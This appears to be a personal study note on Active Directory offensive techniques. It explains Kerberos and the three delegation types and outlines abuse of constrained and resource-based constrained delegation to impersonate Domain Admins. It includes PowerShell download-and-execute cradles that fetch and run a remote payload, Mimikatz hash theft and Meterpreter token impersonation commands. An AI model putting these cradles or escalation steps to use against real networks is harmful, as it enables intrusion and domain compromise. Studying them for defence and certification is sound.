



# Good Theory

# PowerShell

Powershell provides access to almost everythin in a Windows platform and Active Directory environment.

It is based on .NET framework and is tightly integreated with Windows.

Note - Powershell is no the blue screen powershell.exe which you run, it is actually `system.Management.Automation.dll`. The blue console which you run is just one of the way to execute powershell.

Windows Powershell - powershell that comes with Windows platform
Powershell Core - it is platform independent

**Load PowerShell Module**

1. Using dot sourcing
```
> . C:\AD\Tools\PowerView.ps1
```
2. Using Import-Module
```
Import-Module C:\AD\Tools\PowerView.ps1
```
3. All commands in a module can be listed with:
```
Get-Command -Module <modulename>
```
**Load Powershell Module Remotely**

To load remotely we can use `Download execute cradle`

Old and Lengthy way using 
```
iex (New-Object Net.WebClient).DownloadString('http://webserver/payload.ps1')
```
Basically what we are doing above is, we are creating an object of .NET class called Net.WebClient which contains a method called DownloadString which downloads the powershell script in memory which (iex) ie Invoke Expression can execute

From PS3 onwards    
```
iex (iwr 'http://webserver/payload.ps1')
```






## Kerberos

A simplified overview of Kerberos:

1. When users log in, they encrypt a piece of information (a timestamp) with an encryption key derived from their password, to prove to the authentication server that they know the password. This step is called “preauthentication”.

2. In Active Directory environments, the authentication server is a domain controller.

3. DC then checks the clock skew between the user’s timestamp and the DC timestamp (skew should not be more than 5 minutes by default).Upon successful preauthentication, the authentication server provides the user with a ticket-granting-ticket (TGT), which is valid for a limited time. TGT is encrypted and signed with NTLM hash of krbtgt (krbtgt account made specifically for this purpose)

4. When a user wishes to authenticate to a certain service, the user presents the TGT to the authentication server. If the TGT is valid, the user receives a ticket-granting service (TGS), also known as a “service ticket”, from the authentication server. note the TGS is encrypted with the NTLM hash of the requested service’s service account, requested service can decrypt the TGS as the service knows its own NTLM hash

5. The user can then present the TGS to the service they want to access, and the service can authenticate the user and make authorisation decisions based on the data contained in the TGS.

![alt text](https://shenaniganslabs.io/images/TrustedToAuthForDelegationWho/Diagrams/Kerberos101.png)

## Kerberos Delegations

Delegation in Active Directory allows a service to authenticate on behalf of a user, enabling seamless authentication across multiple services.

There are three types of delegation

1. `Unconstrained Delegation`: Any service running on the delegated machine can impersonate users without restrictions.
2. `Constrained Delegation`: The delegation is restricted to specific services, limiting potential abuse.
3. `Resource-Based Constrained Delegation (RBCD)`: Introduced in Windows Server 2012, RBCD enables a resource (e.g., a server) to define which accounts can delegate to it.

### UnConstrained Delegation
Consider there is a web server (ie service account) which needs to impersonate a user to connect mysql service. This will normally happen when a user authenticates to web server using kerberos or other protocol and user wants to access data from mysql service.

When user will authenticate to the web server service, this service will  request TGS for sql service on behalf of users TGT to Domain Controller, Now if Unconstrained Delegation is enabled on web server, the DC place's a copy of users TGT into the service ticket (ie TGS). The web server now opens this TGS and places user's TGT into LSASS for later use. The web server service account can now use this TGT without limitation.

**Attack Scenerio**
You can compromise the web server which hash TGT in LSASS for some user and can impersonate that user without any restriction.


### Constraint Delegation

Obviously unconstrained delegation can be quite dangerous in the hands of a careless admin. Microsoft realized this early on and released ‘constrained’ delegation with Windows 2003. 

In constrained delegation, the impersonation of services is restricted to a specific list of services ie specific service principal names (SPNs) only.

Constrained delegation enables administrators to configure which services an Active Directory user or computer account can delegate to and which authentication protocols can be used. It is configured on the Delegation tab for the AD object

When constrained delegation is set on an account, two things happen under the covers:

1. The userAccountControl attribute for the object is updated with the` “TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION”` flag.
2. The` msDS-AllowedToDelegateTo` attribute is populated with the specified SPN.

The ‘service’ specified is a service principal name that the account is allowed to access while impersonating other users. This is HOST/PRIMARY.testlab.local in our below example.

The field of interest is `msds-allowedtodelegateto`, if a computer/user object has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION then anyone who compromises that account can impersonate any user to the SPNs set in msds-allowedtodelegateto.


![alt text](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*Wdt-V2-Q92EA1Gw5.png)
![alt text](https://miro.medium.com/v2/resize:fit:1100/format:webp/0*qEhdhQoqjLrSvBJH.png)


**Abuse Constraint Delegation**

[More](https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/)

In theory, constrained delegation limits the damage that could result if an AD account is compromised.  But constrained delegation can be abused.

An Attacker who compromises the plaintext password or password hash of an account that is configured with constrained delegation to a service can then he can impersonate any user in the environment to access that service.

To exploit constrained delegation, we need three key things:

1. A compromised account configured with constrained delegation
2. A target privileged account to impersonate when requesting access to the service (ie administrator )
3. Information of the machine hosting the service that we will be gaining access to (ie target DC or server)

**EXAMPLE Scenerio**

Let’s assume the following:

- We have compromised an account with local administrator privileges on a workstation.
- We used Mimikatz to get a password hash left in memory after a logon, and the associated account (the ‘notadmin’ account) has constrained delegation configured.

Thus, all we have so far is access to the one machine we have landed on and the password hash of an account configured for constrained delegation.

1.  First, let’s check the SPN's for which the constrained delegation of the ‘notadmin’ account is configured for. We can also get this information from bloodhound node info.

2. Now once we know that constrained delegation is configured for the X SPN on the Y Domain Controller.

5. Now we can request the ticket granting ticket (TGT) for the account with constrained delegation configured.

6. Now let’s find a good user to impersonate when accessing this service. This can be found from the member of "Domain Admins" group

6. Then execute the (TGS) ticket granting service request for the account we want to impersonate from Domain Admin group. and then access the target service.

7. Now we can use Pass the Ticket to gain access to the X service as one of the domain admin on the Y Domain Controller.


### Understanding RABCD

Delegation in Active Directory allows a service to authenticate on behalf of a user,  There are three types of delegation `Unconstrained Delegation`, Another was introduced in Windows 2003 called `Constrained Delegation` and there is on more introduced in Windows server 2012 called `Resource-Based Constrained Delegation (RBCD)`. In Unconstrained Delegation - Any service running on the delegated machine can impersonate users without restrictions. And in Constrained Delegation - The delegation is restricted to specific services, limiting potential abuse.

In Resource-Based Constrained Delegation (RBCD): Enables a resource (e.g., a server) to define which accounts can delegate to it.

Unlike other two delegation, RBCD is configured on the target machine (resource) instead of the user account. This makes it more flexible but also introduces risks when improperly configured

[More](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)

BloodHound helps identify delegation misconfigurations that can be exploited for RBCD attacks.
![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj43-CoTRyz0jRkeuOhfweO2XTmphinH6_EHox1NNgRzydOo2uMNdg9Vy8zh1F4GYAJ6PixeqADW8uWAEHy2oqDvqsYGvUGTb5t8_GcIzdFuecbrEjT0rDU2iXfLbXrny8jvho5llIaFHE0z1i8aob7LvXKk6S4hyphenhyphenpOhLIRaAzDr_9PbDrFM0MmwiWdqyXM/s16000/5.png)
![alt text](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3C9lE6C15TgYfCJbThncMTlMGXdOepitC9sbwafybveULMIrqOB8rBcXRWidXEz8FG-ebCRvJgC952M7VCqAooJupQTaQSqmplHuDezoY8bWMJuN9VEFoV_mP5Ou-hqyN6S3OIfskcLm2nb_lcA27nieo46YjssGIHfk2-kvIiZQlCqgsDt444Msq6JL3/s16000/6.png)

**Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties**

**Attack Scenerio**

If an attacker gains control over a Domain Controller computer object and modifies its delegation settings, they can effectively impersonate Domain Controller's privileged accounts, leading to full domain compromise.

This simply means that the compromised domain joined user who has write privilege (ie `GenericAll`) over a DC computer object can add a fake computer in that domain, and then (by abusing GenericAll rights) configure that DC to allow that fake machine to impersonate as DC. 

(by default, any user on domain joined computer can create add up to 10 machines to that domain, this is configured in the `ms-ds-machineaccountquota` attribute, which needs to be larger than 0.)

Note that A user or machine can be granted permission to act on behalf of other identities by modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target machine. In this case Fake computer can be granted permission to act on behalf of Domain Controller by changing Domain Controller's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

The User then uses fake machine account to requests a Kerberos Service Ticket for a privileged DC user (e.g., Administrator) using Service for User to Self (S4U2Self).

Then, it escalates the ticket using Service for User to Proxy (S4U2Proxy) to obtain access to DC$.


## All Potato Attacks

https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all

## DACL

# MERPRETER

## Windows SeImpersonatePrivilege escalation
    
- Token Impersonation using Meterpreter Incognito module

    - `load incognito` > `list_tokens -u` > `impersonate_token "ATTACKDEFENSE\Administrator"`
        - In this we impersonate existing token
